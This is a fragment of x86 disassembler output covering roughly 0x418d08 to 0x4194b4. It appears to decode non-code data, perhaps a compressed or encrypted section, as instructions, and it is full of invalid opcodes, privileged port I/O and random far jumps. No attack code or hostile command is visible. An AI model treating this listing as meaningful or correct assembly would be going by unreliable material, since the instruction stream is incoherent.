  418d08:	mov    DWORD PTR [ebx-0x61],0x37042758
  418d0f:	and    edi,DWORD PTR [esi]
  418d11:	cdq    
  418d12:	xor    BYTE PTR [eax],0xcf
  418d15:	pop    edx
  418d16:	xchg   esi,eax
  418d17:	popf   
  418d18:	cmp    eax,DWORD PTR [ebp-0x7d]
  418d1b:	and    BYTE PTR [edx-0x55295a8f],0xd7
  418d22:	sbb    DWORD PTR ds:0x96265952,edx
  418d28:	xchg   ecx,eax
  418d29:	repz xor al,0x4d
  418d2c:	aad    0xf8
  418d2e:	(bad)  
  418d2f:	aad    0x4f
  418d31:	jns    0x418cd2
  418d33:	xor    BYTE PTR [ebx-0x7094f1aa],0x9b
  418d3a:	adc    ebx,ecx
  418d3c:	inc    esi
  418d3d:	push   ebp
  418d3e:	xor    BYTE PTR [ebx],dl
  418d40:	outs   dx,BYTE PTR ds:[esi]
  418d41:	sbb    al,0xff
  418d43:	fs inc esi
  418d45:	pop    ebx
  418d46:	mov    dh,BYTE PTR [edx]
  418d48:	scas   eax,DWORD PTR es:[edi]
  418d49:	or     DWORD PTR [ecx],ebp
  418d4b:	out    dx,eax
  418d4c:	xor    DWORD PTR [ecx-0x485bb89b],esp
  418d52:	scas   eax,DWORD PTR es:[edi]
  418d53:	nop
  418d54:	sar    BYTE PTR [esi+esi*2-0x6b],1
  418d58:	cwde   
  418d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5a:	fnstenv [edi-0x241769ab]
  418d60:	cmp    ebx,DWORD PTR [ebx+0x67fa296]
  418d66:	dec    ebp
  418d67:	gs loop 0x418d6f
  418d6a:	fs loopne 0x418d00
  418d6d:	lahf   
  418d6e:	int3   
  418d6f:	xchg   edx,eax
  418d70:	cwde   
  418d71:	sub    ebp,DWORD PTR [ecx+0x427bd8c6]
  418d77:	jmp    0x9315:0x372248ce
  418d7e:	leave  
  418d7f:	mov    eax,ds:0x707720da
  418d84:	xor    eax,0x436b244d
  418d89:	ins    DWORD PTR es:[edi],dx
  418d8a:	xor    al,BYTE PTR [ebp+eiz*4+0x4a3d78d7]
  418d91:	sub    edx,DWORD PTR [ecx+0x7de17b57]
  418d97:	sbb    al,0xf6
  418d99:	add    al,0x6f
  418d9b:	test   al,0x2a
  418d9d:	fwait
  418d9e:	pop    ebx
  418d9f:	mov    dh,0x95
  418da1:	cdq    
  418da2:	jnp    0x418dc9
  418da4:	inc    ebx
  418da5:	gs stos DWORD PTR es:[edi],eax
  418da7:	jbe    0x418dd9
  418da9:	inc    ecx
  418daa:	ficom  DWORD PTR ds:0x387bca7b
  418db0:	inc    ebx
  418db1:	pushf  
  418db2:	xchg   edi,eax
  418db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418db4:	ds nop
  418db6:	loopne 0x418d6a
  418db8:	xor    eax,DWORD PTR [edi]
  418dba:	jecxz  0x418dc7
  418dbc:	imul   esp,DWORD PTR ds:0x1ecd7ed7,0x5ef393a8
  418dc6:	jp     0x418d7a
  418dc8:	int    0x13
  418dca:	cmp    eax,0x5d9bf6e0
  418dcf:	jns    0x418deb
  418dd1:	shr    BYTE PTR [eax-0x3bda4a53],cl
  418dd7:	pusha  
  418dd8:	push   ss
  418dd9:	mov    dl,0xb2
  418ddb:	push   esp
  418ddc:	lahf   
  418ddd:	pop    ecx
  418dde:	dec    ebx
  418ddf:	and    esp,esi
  418de1:	inc    ebp
  418de2:	xor    DWORD PTR [ebx],0x11
  418de5:	or     DWORD PTR [edi-0x56],edi
  418de8:	add    al,0x60
  418dea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418deb:	add    DWORD PTR [ebx],ecx
  418ded:	mov    al,0x46
  418def:	popf   
  418df0:	dec    edx
  418df1:	cli    
  418df2:	popa   
  418df3:	pushf  
  418df4:	scas   al,BYTE PTR es:[edi]
  418df5:	inc    esp
  418df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418df7:	loopne 0x418e6f
  418df9:	test   DWORD PTR [ebx],ecx
  418dfb:	bound  ecx,QWORD PTR [edi-0x4a]
  418dfe:	call   0xfb69:0x1aa9cea0
  418e05:	mov    ?,ecx
  418e07:	js     0x418dc6
  418e09:	pusha  
  418e0a:	int3   
  418e0b:	loopne 0x418dd6
  418e0d:	xchg   ecx,eax
  418e0e:	mov    esp,0x6cb53222
  418e13:	and    eax,DWORD PTR [esi+eiz*8]
  418e16:	out    dx,al
  418e17:	cwde   
  418e18:	and    BYTE PTR [edx],bl
  418e1a:	dec    ebx
  418e1b:	(bad)  
  418e1d:	cmp    DWORD PTR [ecx+0x23c1bcda],esp
  418e23:	jecxz  0x418e4a
  418e25:	xchg   ebp,eax
  418e26:	jae    0x418e42
  418e28:	rol    BYTE PTR [ebp+ebp*2+0x30],1
  418e2c:	inc    eax
  418e2d:	inc    ecx
  418e2e:	sbb    DWORD PTR [ebx*8+0x7c37a33b],ebx
  418e35:	pusha  
  418e36:	out    dx,al
  418e37:	xchg   esi,eax
  418e38:	adc    DWORD PTR [eax+ecx*8+0x47],0xc1055888
  418e40:	and    dl,cl
  418e42:	jns    0x418e2b
  418e44:	ficomp DWORD PTR [ebx+0x76]
  418e47:	js     0x418e40
  418e49:	add    ch,BYTE PTR [ebp-0x4c4cd6e5]
  418e4f:	inc    ebp
  418e50:	(bad)  
  418e51:	aad    0xf6
  418e53:	or     al,0xc7
  418e55:	xchg   ecx,eax
  418e56:	lods   eax,DWORD PTR ds:[esi]
  418e57:	push   ds
  418e58:	mov    al,ds:0x8b1c4a71
  418e5d:	mov    DWORD PTR [ecx],edi
  418e5f:	pop    edi
  418e60:	mov    BYTE PTR [edx-0x1a],cl
  418e63:	mov    eax,ds:0x7284ad6c
  418e68:	out    0xa9,eax
  418e6a:	lea    ecx,[ebp+0xdd1006d]
  418e70:	int    0x80
  418e72:	inc    di
  418e74:	push   0xbbde3406
  418e79:	or     ebx,edx
  418e7b:	adc    eax,0x21fa65d3
  418e80:	mov    bh,0xc
  418e82:	xchg   edx,eax
  418e83:	dec    ecx
  418e84:	mov    ebx,0x3dafd5da
  418e89:	stos   BYTE PTR es:[edi],al
  418e8a:	je     0x418ee2
  418e8c:	imul   edi,DWORD PTR [edx+0x2fe7bd16],0xffffffec
  418e93:	mov    dl,0x1c
  418e95:	push   esi
  418e96:	push   ss
  418e97:	pop    ecx
  418e98:	adc    dl,BYTE PTR [ebp-0x415725fa]
  418e9e:	inc    eax
  418e9f:	enter  0xb296,0x0
  418ea3:	lods   eax,DWORD PTR ds:[esi]
  418ea4:	mov    ds:0xcaee83e6,eax
  418ea9:	push   esi
  418eaa:	mov    eax,0xab7f1fd3
  418eaf:	scas   eax,DWORD PTR es:[edi]
  418eb0:	ja     0x418e72
  418eb2:	test   eax,0xaaaae573
  418eb7:	je     0x418ead
  418eb9:	adc    dl,ah
  418ebb:	retf   0xeec9
  418ebe:	jb     0x418e83
  418ec0:	(bad)  
  418ec1:	call   0x90dce3ef
  418ec6:	cld    
  418ec7:	data16 (bad) 
  418ec9:	push   ebp
  418eca:	jbe    0x418e8d
  418ecc:	jp     0x418e67
  418ece:	cmp    DWORD PTR [edi+ebx*2-0x73c1e7b2],0xffffffa4
  418ed6:	and    al,0xcf
  418ed8:	xor    eax,0xd574ad6c
  418edd:	mov    edx,0xdc115362
  418ee2:	sub    esp,DWORD PTR [esi+edi*8]
  418ee5:	sbb    BYTE PTR [ebx],ch
  418ee7:	sbb    BYTE PTR [ebp-0x33],ah
  418eea:	fdiv   DWORD PTR [edx+esi*2]
  418eed:	inc    eax
  418eee:	adc    BYTE PTR [eax+0x27],al
  418ef1:	add    DWORD PTR ds:0x49f9dd4b,esp
  418ef7:	(bad)  
  418ef8:	fstp   TBYTE PTR [ecx+edi*1+0x564151e6]
  418eff:	mov    BYTE PTR [eax+ebx*1-0x30ebba8d],bl
  418f06:	lods   al,BYTE PTR ds:[esi]
  418f07:	jecxz  0x418eaa
  418f09:	(bad)
  418f0d:	pop    edx
  418f0e:	aam    0xa2
  418f10:	xchg   edi,eax
  418f11:	jmp    0xe36b:0x6ca864ae
  418f18:	sub    eax,0x3401cc32
  418f1d:	xchg   ebp,eax
  418f1e:	(bad)  
  418f21:	jle    0x418eb9
  418f23:	sbb    bl,BYTE PTR [edx+edx*4-0xd]
  418f27:	call   0xbbb3:0x74a86229
  418f2e:	popa   
  418f2f:	xor    ah,BYTE PTR [ebp+eax*1+0x63]
  418f33:	xchg   edx,eax
  418f34:	cmp    ecx,DWORD PTR [edi]
  418f36:	ins    DWORD PTR es:[edi],dx
  418f37:	xchg   ecx,eax
  418f38:	push   edi
  418f39:	fimul  WORD PTR [ecx+ecx*8]
  418f3c:	dec    ecx
  418f3d:	inc    ebx
  418f3e:	stos   BYTE PTR es:[edi],al
  418f3f:	cmp    ch,ah
  418f41:	aaa    
  418f42:	mov    bh,0x99
  418f44:	(bad)  
  418f45:	out    0x25,al
  418f47:	mov    esi,0x73891535
  418f4c:	inc    eax
  418f4d:	xchg   ebp,eax
  418f4e:	dec    ebp
  418f4f:	adc    eax,0x53ed8576
  418f54:	cmc    
  418f55:	push   ebx
  418f56:	dec    esp
  418f57:	dec    ecx
  418f58:	mov    bl,0x5a
  418f5a:	mov    dl,0x5
  418f5c:	addr16 in al,dx
  418f5e:	and    al,0x87
  418f60:	jge    0x418f63
  418f62:	push   eax
  418f63:	loop   0x418f7c
  418f65:	lods   eax,DWORD PTR ds:[esi]
  418f66:	push   ss
  418f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f68:	xchg   esp,eax
  418f69:	add    cl,BYTE PTR [ebp+0x568ab745]
  418f6f:	push   edi
  418f70:	rcl    BYTE PTR [eax-0x5d],cl
  418f73:	mov    edi,0x43e812ce
  418f78:	lock out 0x3f,al
  418f7b:	xlat   BYTE PTR ds:[ebx]
  418f7c:	test   al,0x7e
  418f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f7f:	mov    esp,0xe12f98bd
  418f84:	xor    DWORD PTR [ecx-0x3e],ebp
  418f87:	inc    esi
  418f88:	cmp    DWORD PTR [esi-0x45a72e78],ecx
  418f8e:	sar    DWORD PTR [ebx+0x4f],1
  418f91:	adc    ebp,DWORD PTR [ebp+0xcc235a3]
  418f97:	sbb    esi,ebx
  418f99:	aad    0x61
  418f9b:	xor    DWORD PTR [eax-0x3f],eax
  418f9e:	call   0x8531363a
  418fa3:	into   
  418fa4:	ins    BYTE PTR es:[edi],dx
  418fa5:	cmp    bh,BYTE PTR [edi+edi*4+0x1e]
  418fa9:	push   es
  418faa:	mov    ah,0xb
  418fac:	loopne 0x419008
  418fae:	cmp    eax,DWORD PTR [ebx]
  418fb0:	stos   DWORD PTR es:[edi],eax
  418fb1:	add    eax,0x32395581
  418fb6:	adc    al,0x86
  418fb8:	pop    ebx
  418fb9:	lds    edx,FWORD PTR [edi]
  418fbb:	add    ebp,DWORD PTR [ebx]
  418fbd:	add    bl,ah
  418fbf:	out    dx,al
  418fc0:	push   ebp
  418fc1:	add    al,0x4b
  418fc3:	push   es
  418fc4:	es ins DWORD PTR es:[edi],dx
  418fc6:	mov    ds:0xf4af4a45,al
  418fcb:	cmp    DWORD PTR [eax-0x14690e6e],edi
  418fd1:	je     0x418fd6
  418fd3:	mul    BYTE PTR [esi-0xe]
  418fd6:	div    eax
  418fd8:	das    
  418fd9:	cld    
  418fda:	mov    ecx,0x80350278
  418fdf:	int3   
  418fe0:	mov    ebx,0x5e9f77e8
  418fe5:	bound  eax,QWORD PTR [esi]
  418fe7:	pusha  
  418fe8:	cs pop es
  418fea:	ror    dl,0xb9
  418fed:	aam    0x4a
  418fef:	mov    dh,0x70
  418ff1:	enter  0xac85,0x6f
  418ff5:	mov    al,0x79
  418ff7:	mov    al,ds:0xa544d314
  418ffc:	mov    dl,0xd2
  418ffe:	push   esp
  418fff:	fwait
  419000:	mov    eax,ds:0x43c350c5
  419005:	int    0x7b
  419007:	jo     0x418fd0
  419009:	and    eax,0xf4fbde13
  41900e:	scas   eax,DWORD PTR es:[edi]
  41900f:	lds    ebp,FWORD PTR [eax+0x35]
  419012:	test   al,0x8
  419014:	pusha  
  419015:	or     BYTE PTR [ebx+0x51],bl
  419018:	repz shl WORD PTR [edx+ebp*4-0x33cbcdb2],1
  419021:	inc    esp
  419022:	stc    
  419023:	dec    esi
  419024:	mov    edi,0xd6815ef5
  419029:	dec    esi
  41902a:	scas   eax,DWORD PTR es:[edi]
  41902b:	xchg   ebx,eax
  41902c:	mov    dl,ah
  41902e:	popf   
  41902f:	shr    BYTE PTR [edi],1
  419031:	adc    BYTE PTR [edi+0x64e99c90],bh
  419037:	aaa    
  419038:	push   cs
  419039:	xor    bh,dl
  41903b:	jne    0x419075
  41903d:	push   eax
  41903e:	into   
  41903f:	mov    eax,0x63429685
  419044:	dec    ecx
  419045:	stc    
  419046:	jecxz  0x4190c0
  419048:	cs dec ebx
  41904a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41904b:	cmp    DWORD PTR [edi],esi
  41904d:	pop    ebx
  41904e:	pop    eax
  41904f:	and    BYTE PTR [edx-0x7a],0xa0
  419053:	pop    esi
  419054:	fsubrp st(6),st
  419056:	neg    DWORD PTR [eax+0x4f]
  419059:	fiadd  WORD PTR [esp+eiz*2-0x6c3cd22c]
  419060:	out    0x85,al
  419062:	out    dx,eax
  419063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419064:	and    eax,0x3066a51e
  419069:	and    DWORD PTR [edi],esi
  41906b:	jno    0x41906c
  41906d:	(bad)  
  41906e:	jecxz  0x4190c4
  419070:	outs   dx,BYTE PTR ds:[esi]
  419071:	adc    BYTE PTR [edi+0x217cf1bd],0x8b
  419078:	push   esi
  419079:	jmp    FWORD PTR [edx]
  41907b:	dec    esp
  41907c:	(bad)  
  41907d:	imul   esp,ecx,0xffffff84
  419080:	xor    BYTE PTR [esi],al
  419082:	retf   0x8791
  419085:	cdq    
  419086:	mov    eax,ds:0x26a7c8b4
  41908b:	aaa    
  41908c:	mov    edi,fs
  41908e:	xor    bl,bl
  419090:	mov    bl,0x88
  419092:	out    dx,al
  419093:	lds    ebx,FWORD PTR [edi-0x66af0047]
  419099:	mov    ecx,esi
  41909b:	in     al,0xc2
  41909d:	inc    esp
  41909e:	sub    eax,0xa0a1f75a
  4190a3:	pop    ebp
  4190a4:	xor    edx,DWORD PTR [eax-0x6e3e16e9]
  4190aa:	adc    BYTE PTR [eax+edi*4+0x4b],bh
  4190ae:	test   eax,0x83837b8
  4190b3:	push   eax
  4190b4:	sub    BYTE PTR [esi-0x133dee69],dl
  4190ba:	mov    ebp,0x5f0ffacc
  4190bf:	push   ebx
  4190c0:	push   ecx
  4190c1:	mov    esi,0x485e7f1a
  4190c6:	push   eax
  4190c7:	ja     0x4190d7
  4190c9:	sub    edx,edx
  4190cb:	mov    ah,0x86
  4190cd:	aam    0x92
  4190cf:	fdivp  st(5),st
  4190d1:	test   edi,ecx
  4190d3:	sbb    edi,DWORD PTR [ecx-0x11]
  4190d6:	mov    esp,0x4946ec9b
  4190db:	cmc    
  4190dc:	xchg   esi,eax
  4190dd:	jno    0x41906f
  4190df:	outs   dx,DWORD PTR ds:[esi]
  4190e0:	arpl   si,bp
  4190e2:	or     bh,BYTE PTR [edx]
  4190e4:	dec    edx
  4190e5:	shl    DWORD PTR [esi-0x47],1
  4190e8:	(bad)  
  4190ea:	ret    0xa9ba
  4190ed:	push   esi
  4190ee:	popa   
  4190ef:	je     0x4190e5
  4190f1:	add    eax,0xffd8b581
  4190f6:	iret   
  4190f7:	sub    al,0xd5
  4190f9:	xor    ecx,esi
  4190fb:	je     0x4190cf
  4190fd:	push   ds
  4190fe:	pop    ebp
  4190ff:	or     eax,0x26fe3d72
  419104:	dec    eax
  419105:	or     eax,0xcb06167c
  41910a:	or     bl,ah
  41910c:	jp     0x419116
  41910e:	jl     0x419100
  419110:	mov    dl,0x55
  419112:	pop    ds
  419113:	push   esp
  419114:	pop    eax
  419115:	sub    bh,BYTE PTR [edx-0x57e6454c]
  41911b:	in     al,0xfe
  41911d:	test   al,0x35
  41911f:	repnz xor eax,0x779e5bf3
  419125:	in     eax,dx
  419126:	xchg   esp,eax
  419127:	push   ebx
  419128:	cmp    ebp,esi
  41912a:	jecxz  0x41913d
  41912c:	push   es
  41912d:	push   ss
  41912e:	add    DWORD PTR [ebx+0x736e2a5e],ebp
  419134:	jnp    0x41911e
  419136:	gs push dx
  419139:	scas   eax,DWORD PTR es:[edi]
  41913a:	out    0x79,al
  41913c:	test   al,0x44
  41913e:	dec    ebp
  41913f:	jb     0x419113
  419141:	mov    edx,esi
  419143:	and    al,0xb1
  419145:	mov    bl,0xd9
  419147:	xchg   ecx,eax
  419148:	lea    esp,[eax-0x11dc36a5]
  41914e:	xchg   edi,ebx
  419150:	imul   eax,DWORD PTR [ebx],0xbb206cfb
  419156:	mov    eax,0x1f35fb7e
  41915b:	and    DWORD PTR [eax],ebp
  41915d:	inc    edi
  41915e:	test   al,0x60
  419160:	xadd   ebp,esi
  419163:	sub    cl,BYTE PTR [edi-0x42]
  419166:	or     edi,DWORD PTR [edx]
  419168:	cmp    DWORD PTR [ebx+0x7e],eax
  41916b:	push   esp
  41916c:	jge    0x419195
  41916e:	xor    ecx,DWORD PTR [ebp+0x66]
  419171:	in     al,dx
  419172:	xchg   edi,eax
  419173:	jmp    0x419138
  419175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419176:	popa   
  419177:	pop    ebp
  419178:	jmp    0xf84bfeca
  41917d:	ins    BYTE PTR es:[edi],dx
  41917e:	cli    
  41917f:	add    al,0x57
  419181:	or     BYTE PTR [eax],ch
  419183:	out    0xd2,eax
  419185:	cli    
  419186:	inc    ecx
  419187:	cld    
  419188:	mov    cl,0xca
  41918a:	aaa    
  41918b:	pushf  
  41918c:	cmp    eax,0x9f2086b2
  419191:	adc    DWORD PTR [ebp-0x3d261a74],ebp
  419197:	adc    eax,0xeaed0207
  41919c:	not    BYTE PTR [eax+0x23]
  41919f:	and    ebx,DWORD PTR [ebx+0x0]
  4191a2:	jmp    0x5862:0x1928c3e9
  4191a9:	popf   
  4191aa:	cmc    
  4191ab:	or     ah,BYTE PTR [eax+0x19d93b82]
  4191b1:	int3   
  4191b2:	adc    al,0xe0
  4191b4:	add    cl,al
  4191b6:	outs   dx,DWORD PTR ds:[esi]
  4191b7:	faddp  st(7),st
  4191b9:	jecxz  0x41917f
  4191bb:	fimul  WORD PTR [ebx]
  4191bd:	aam    0x98
  4191bf:	pop    eax
  4191c0:	lock pop ds
  4191c2:	jne    0x4191a1
  4191c4:	pop    esi
  4191c5:	or     ch,bl
  4191c7:	imul   ebx,ebx,0xffffffd3
  4191ca:	cmp    al,0xc3
  4191cc:	xor    BYTE PTR [esi-0x30d0475a],bh
  4191d2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4191d4:	cld    
  4191d5:	shl    esi,cl
  4191d7:	pop    es
  4191d8:	inc    edx
  4191d9:	scas   al,BYTE PTR es:[edi]
  4191da:	jle    0x4191b2
  4191dc:	push   ebp
  4191dd:	ret    0xb70c
  4191e0:	std    
  4191e1:	test   eax,0x85b23c6d
  4191e6:	jmp    0x61a64dc5
  4191eb:	(bad)  
  4191ec:	lock adc al,0xb1
  4191ef:	int3   
  4191f0:	shr    BYTE PTR [esi-0x59ae4781],0x90
  4191f7:	repnz sbb al,0x16
  4191fa:	or     al,0xe6
  4191fc:	pop    edx
  4191fd:	daa    
  4191fe:	push   es
  4191ff:	out    0x4e,eax
  419201:	jno    0x419235
  419203:	ret    0x6a68
  419206:	sti    
  419207:	adc    ecx,DWORD PTR [eax+0x7d]
  41920a:	jmp    DWORD PTR [eax+0x2e]
  41920d:	pop    esp
  41920e:	repnz and DWORD PTR [eax-0x2b674003],0x14
  419216:	cmp    eax,esi
  419218:	mov    bh,0xd3
  41921a:	jno    0x419270
  41921c:	push   0x61b88aee
  419221:	popf   
  419222:	mov    ch,0xd6
  419224:	ret    0x6663
  419227:	hlt    
  419228:	sub    eax,0x9fbb43ac
  41922d:	mov    DWORD PTR [bx+si-0x73],esi
  419231:	dec    edx
  419232:	pop    esp
  419233:	or     BYTE PTR [eax+0x631c6289],bl
  419239:	sbb    bl,BYTE PTR [eax+eiz*1-0x4f18474c]
  419240:	push   edx
  419241:	loopne 0x41921f
  419243:	(bad)  
  419245:	enter  0x159a,0x48
  419249:	test   DWORD PTR [ebx-0x74bd7ea4],ebp
  41924f:	cmp    DWORD PTR [ebx],eax
  419251:	clc    
  419252:	(bad)  
  419253:	loop   0x4192c2
  419255:	push   es
  419256:	in     eax,0x7c
  419258:	mov    BYTE PTR [edx+0xfc635e],dl
  41925e:	pop    esi
  41925f:	push   ss
  419260:	mov    ebx,0xe14f7c64
  419265:	daa    
  419266:	add    bh,cl
  419268:	jmp    0x41cdcadb
  41926d:	dec    ebp
  41926e:	bound  ebp,QWORD PTR [ebx-0x3fd74ba9]
  419274:	cmp    edx,eax
  419276:	mov    ?,WORD PTR [esi+0x50]
  419279:	nop
  41927a:	xor    DWORD PTR ds:0xad219ffb,0xffffffc3
  419281:	pop    ecx
  419282:	and    BYTE PTR [ebp-0x5c],0x5d
  419286:	add    esp,esp
  419288:	pop    esp
  419289:	cmp    eax,DWORD PTR [edx-0x390c5644]
  41928f:	and    DWORD PTR [eax],eax
  419291:	xchg   edx,eax
  419292:	test   BYTE PTR [ebx],al
  419294:	jle    0x41923d
  419296:	jmp    0x651e:0xe0d34415
  41929d:	out    dx,eax
  41929e:	adc    eax,0x1458b532
  4192a3:	fistp  DWORD PTR [esi]
  4192a5:	push   ss
  4192a6:	test   al,0x5c
  4192a8:	das    
  4192a9:	xchg   DWORD PTR [edx+0x7d7d23aa],ebx
  4192af:	add    al,0xe8
  4192b1:	imul   esi,DWORD PTR [ecx],0x8
  4192b4:	cmp    BYTE PTR [ebx],ch
  4192b6:	adc    dh,BYTE PTR [ecx-0x5419716]
  4192bc:	mov    ds:0x63e2fa32,al
  4192c1:	cmp    cl,BYTE PTR [esi+0x1587443]
  4192c7:	neg    BYTE PTR [ebp-0x782262f7]
  4192cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ce:	fisttp DWORD PTR [ebx+0x3a]
  4192d1:	jg     0x41929b
  4192d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192d4:	xlat   BYTE PTR ds:[ebx]
  4192d5:	mov    ebp,0x7936928f
  4192da:	push   ds
  4192db:	cld    
  4192dc:	cmp    esp,ebp
  4192de:	out    dx,al
  4192df:	ins    DWORD PTR es:[edi],dx
  4192e0:	push   es
  4192e1:	xchg   DWORD PTR [eax-0x2bbe7dd0],ecx
  4192e7:	push   DWORD PTR [edx-0x54]
  4192ea:	mov    bl,0x60
  4192ec:	popa   
  4192ed:	sub    eax,0xb822a6d2
  4192f2:	or     dh,BYTE PTR [edx]
  4192f4:	ja     0x41930b
  4192f6:	jmp    0x41927c
  4192f8:	and    edx,DWORD PTR ds:0x5faef367
  4192fe:	aam    0xcf
  419300:	jae    0x4192ef
  419302:	sub    ah,BYTE PTR [edx]
  419304:	mov    dl,0x28
  419306:	pop    ss
  419307:	push   ecx
  419308:	sbb    BYTE PTR [ebx-0x3dd02fe7],bl
  41930e:	out    0x1b,eax
  419310:	sub    al,0x74
  419312:	push   eax
  419313:	mov    bl,0x20
  419315:	jmp    0x84be:0x639a54f
  41931c:	test   al,dh
  41931e:	fisub  WORD PTR [edi-0x30]
  419321:	mov    bl,0xc2
  419323:	cmp    ebx,DWORD PTR [ebp-0x49ca7bb3]
  419329:	jp     0x419331
  41932b:	in     al,0x14
  41932d:	sub    eax,0x771c7d2d
  419332:	dec    edi
  419333:	mov    DWORD PTR [esi-0x1a],edx
  419336:	sub    DWORD PTR [eax-0x423e84f0],0x37
  41933d:	iret   
  41933e:	mov    ah,0x41
  419340:	jnp    0x419356
  419342:	mov    BYTE PTR [edi+0x1c],ah
  419345:	jb     0x4193b4
  419347:	in     eax,0xc2
  419349:	dec    ebx
  41934a:	sub    esi,esp
  41934c:	adc    DWORD PTR [eax],ebp
  41934e:	(bad)  
  41934f:	shr    edi,0xe6
  419352:	pop    ss
  419353:	pop    edi
  419354:	mov    bl,0xa8
  419356:	in     eax,dx
  419357:	sub    DWORD PTR [ecx+edi*8-0x6e],0xf117544a
  41935f:	pusha  
  419360:	mov    esi,0x91495806
  419365:	lea    esi,[ebp+eiz*2-0x5d0baa57]
  41936c:	das    
  41936d:	ins    BYTE PTR es:[edi],dx
  41936e:	mul    ch
  419370:	xor    eax,0xaac8900a
  419375:	mov    ds:0x228ead8f,eax
  41937a:	xchg   edi,eax
  41937b:	mov    bl,0x70
  41937d:	sub    dl,BYTE PTR [ebx+0x3628f24b]
  419383:	jns    0x4193e3
  419385:	test   DWORD PTR [eax],ebx
  419387:	std    
  419388:	dec    ecx
  419389:	sbb    eax,DWORD PTR [eax]
  41938b:	lds    ebp,FWORD PTR [eax+0x57f3bb5d]
  419391:	pop    es
  419392:	push   ds
  419393:	shr    BYTE PTR [ecx+ebx*4],0xd1
  419397:	mov    dl,0x7f
  419399:	rcr    edx,1
  41939b:	mov    ds:0x78a81f85,eax
  4193a0:	popf   
  4193a1:	(bad)  
  4193a2:	iret   
  4193a3:	pop    ecx
  4193a4:	das    
  4193a5:	push   ebx
  4193a6:	test   BYTE PTR [eax+0x52],ch
  4193a9:	out    dx,eax
  4193aa:	fcomp  DWORD PTR [ebp-0x66fa8509]
  4193b0:	cmp    eax,0xf7424903
  4193b5:	jge    0x419426
  4193b7:	outs   dx,DWORD PTR ds:[esi]
  4193b8:	push   ebx
  4193b9:	addr16 mov ecx,edi
  4193bc:	repnz cmc 
  4193be:	lahf   
  4193bf:	mov    eax,ds:0x9c42c3b2
  4193c4:	add    eax,0x68e42a62
  4193c9:	fwait
  4193ca:	ds jae 0x419352
  4193cd:	or     DWORD PTR [esi],eax
  4193cf:	ffree  st(0)
  4193d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193d2:	add    BYTE PTR [ebp+0x3a],dl
  4193d5:	pop    ebx
  4193d6:	cld    
  4193d7:	test   BYTE PTR [ebp-0x4e66e093],dl
  4193dd:	test   al,0x51
  4193df:	dec    esi
  4193e0:	sbb    ah,bh
  4193e2:	push   edi
  4193e3:	cdq    
  4193e4:	jo     0x419442
  4193e6:	out    0x6f,eax
  4193e8:	cld    
  4193e9:	mov    ebp,0x84a38c54
  4193ee:	and    ebx,ebx
  4193f0:	mov    esp,0x3fdfa3b1
  4193f5:	inc    eax
  4193f6:	inc    ecx
  4193f7:	dec    esp
  4193f8:	stos   DWORD PTR es:[edi],eax
  4193f9:	in     eax,dx
  4193fa:	mov    dl,0xb5
  4193fc:	sbb    al,0x77
  4193fe:	int    0x56
  419400:	ins    BYTE PTR es:[edi],dx
  419401:	dec    ebp
  419402:	and    cl,ch
  419404:	pop    DWORD PTR [eax+0x11fd714c]
  41940a:	cmp    DWORD PTR [eax+0xc15c98c],eax
  419410:	cmp    eax,0x1aa1969b
  419415:	mov    eax,0xf59e306d
  41941a:	mov    bl,0xa4
  41941c:	dec    edx
  41941d:	les    ebp,FWORD PTR [edi]
  41941f:	je     0x4193eb
  419421:	dec    ebx
  419422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419423:	jl     0x419432
  419425:	test   eax,0xc5b19054
  41942a:	test   BYTE PTR [ecx+0x7ba1173b],ch
  419430:	inc    esp
  419431:	pop    esi
  419432:	add    eax,ebx
  419434:	(bad)  
  419435:	pslld  mm5,mm3
  419438:	inc    eax
  419439:	xor    al,BYTE PTR ds:0x83d45cb9
  41943f:	inc    eax
  419440:	fwait
  419441:	pushf  
  419442:	mov    BYTE PTR [eax],dl
  419444:	or     ebx,DWORD PTR [esi-0x35]
  419447:	mov    eax,fs
  419449:	imul   edx,DWORD PTR [eax-0x2f0e1262],0xffffffb1
  419450:	sub    BYTE PTR [esi],ah
  419452:	retf   0x7778
  419455:	cdq    
  419456:	rol    DWORD PTR [ebp+0x6aa71800],cl
  41945c:	pop    ebp
  41945d:	mov    WORD PTR [edi],ds
  41945f:	pop    esi
  419460:	mov    al,0x31
  419462:	jmp    0x75ebf9e9
  419467:	mov    ?,WORD PTR [edx-0x6]
  41946a:	and    al,0xd3
  41946c:	inc    ebx
  41946d:	jnp    0x41949e
  41946f:	lahf   
  419470:	cmp    ah,dl
  419472:	add    BYTE PTR [eax-0x39],0x9b
  419476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419477:	outs   dx,BYTE PTR ds:[esi]
  419478:	(bad)  
  419479:	aam    0x9d
  41947b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41947c:	inc    esi
  41947d:	push   0xffffff94
  41947f:	add    DWORD PTR [edx+ecx*8],eax
  419482:	aaa    
  419483:	push   cs
  419484:	sti    
  419485:	mov    ebp,0xc40aede9
  41948a:	jmp    DWORD PTR [ebx]
  41948c:	mov    eax,ds:0xd44565ab
  419491:	pop    esi
  419492:	xchg   edx,eax
  419493:	push   cs
  419494:	(bad)  [ebp+0x5061b79f]
  41949a:	xlat   BYTE PTR ds:[ebx]
  41949b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41949c:	dec    eax
  41949d:	test   al,0xb2
  41949f:	jge    0x419479
  4194a1:	aad    0x69
  4194a3:	mov    ebp,0x8f529194
  4194a8:	jmp    0x5411cd76
  4194ad:	and    BYTE PTR [edi+0x18],bh
  4194b0:	push   eax
  4194b1:	dec    edx
  4194b2:	add    al,0x94
  4194b4:	and    edx,edx
